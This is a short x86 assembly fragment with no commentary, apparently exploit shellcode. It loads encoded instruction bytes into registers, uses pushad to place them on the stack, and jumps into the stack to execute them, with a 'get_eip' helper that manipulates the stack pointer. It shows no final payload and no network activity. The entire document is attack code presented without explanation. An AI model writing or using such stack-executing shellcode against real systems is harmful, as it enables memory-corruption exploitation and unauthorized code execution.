call get_eip
and esp, 0xffc0
mov ebx, 0x39ffffff
mov edx, 0xe6440ffc
mov ecx, 0x6c8d6060
mov eax, 0xe5ff3324
pushad
pushad
mov esi, 1024
lea ebp, [esp + 19]
mov edi, 0
jmp ebp

get_eip:
    mov esp, [esp]
    ret
